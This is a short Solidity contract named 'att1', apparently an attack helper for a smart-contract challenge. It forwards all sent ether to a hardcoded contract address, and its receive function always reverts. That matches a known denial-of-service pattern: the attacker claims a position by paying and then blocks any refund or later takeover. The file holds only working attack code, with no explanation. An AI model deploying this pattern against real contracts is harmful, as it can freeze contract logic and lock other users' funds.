pragma solidity ^0.6.12;

contract att1{
    function a() public payable{
        0x5aD9675495Cce5D9D0d1245Ef738CAdC45828E46.call{value : msg.value}("");
    }
    receive() external payable{
        revert();
    }
}